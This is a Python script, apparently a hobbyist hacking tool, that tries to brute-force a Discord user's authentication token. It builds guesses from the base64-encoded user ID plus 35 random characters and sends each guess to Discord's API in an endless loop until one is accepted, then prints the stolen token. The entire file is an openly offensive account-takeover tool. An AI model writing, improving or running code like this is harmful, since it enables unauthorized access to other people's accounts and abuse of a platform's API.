import os, base64, random, requests, datetime, ctypes
from colorama import *
from tkinter import messagebox

def banner():
    print(f"""
                               {Fore.RED}Dev By Tahg{Fore.RESET}
████████╗░█████╗░██╗░░██╗███████╗███╗░░██╗░░░░░░██████╗░██████╗░██╗░░░██╗████████╗███████╗███████╗░█████╗░██████╗░░█████╗░███████╗
╚══██╔══╝██╔══██╗██║░██╔╝██╔════╝████╗░██║░░░░░░██╔══██╗██╔══██╗██║░░░██║╚══██╔══╝██╔════╝██╔════╝██╔══██╗██╔══██╗██╔══██╗██╔════╝
░░░██║░░░██║░░██║█████═╝░█████╗░░██╔██╗██║█████╗██████╦╝██████╔╝██║░░░██║░░░██║░░░█████╗░░█████╗░░██║░░██║██████╔╝██║░░╚═╝█████╗░░
░░░██║░░░██║░░██║██╔═██╗░██╔══╝░░██║╚████║╚════╝██╔══██╗██╔══██╗██║░░░██║░░░██║░░░██╔══╝░░██╔══╝░░██║░░██║██╔══██╗██║░░██╗██╔══╝░░
░░░██║░░░╚█████╔╝██║░╚██╗███████╗██║░╚███║░░░░░░██████╦╝██║░░██║╚██████╔╝░░░██║░░░███████╗██║░░░░░╚█████╔╝██║░░██║╚█████╔╝███████╗
░░░╚═╝░░░░╚════╝░╚═╝░░╚═╝╚══════╝╚═╝░░╚══╝░░░░░░╚═════╝░╚═╝░░╚═╝░╚═════╝░░░░╚═╝░░░╚══════╝╚═╝░░░░░░╚════╝░╚═╝░░╚═╝░╚════╝░╚══════╝
            {Fore.RED}GitHub: {Fore.BLUE}https://github.com/T4hg/ {Fore.RESET}
""")

def bruteforce():
    prefix = f"{Fore.RED}Token {Fore.BLUE}Bruteforce {Fore.GREEN}· {Fore.WHITE}"
    system_prefix = f"{Fore.RED}$ {Fore.GREEN}"
    discord_id = input(prefix + "ID (EXAMPLE: 528884510201217024): ")
    try:
        id_encode = discord_id.encode("UTF-8")
        id_encodeb64 = base64.b64encode(id_encode)
        id_decode = id_encodeb64.decode("UTF-8")
        request_url = "https://discordapp.com/api/v6/users/@me"
        x = datetime.datetime.now()
        print(system_prefix + f"Started at {x.minute}:{x.second}")
        while True:
            try:
                list_ca = list(['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '1', '2', '3', '4', '5', '6', '7', '8', '9', '0', '.', '_'])     
                token = id_decode + ('').join(random.choices(list_ca, k=35))

                headers = {'Authorization': token, 'Content-Type': 'application/json'}  
                respuesta = requests.get(request_url, headers=headers)

                if respuesta.status_code == 200:
                    print(system_prefix + "COMPLETE - " + token)
                    messagebox.showinfo(message=f"BRUTEFORCE COMPLETE", title="Token Bruteforce | Developed By Tahg - GitHub: https://github.com/T4hg/")
                    break
                else:
                    pass
            except:
                pass
    except:
        print(system_prefix + "ERROR")
        bruteforce()

if __name__ == '__main__':
    os.system("cls")
    ctypes.windll.kernel32.SetConsoleTitleW(f'Token Bruteforce | Developed by Tahg - GitHub: https://github.com/T4hg/')
    banner()
    bruteforce()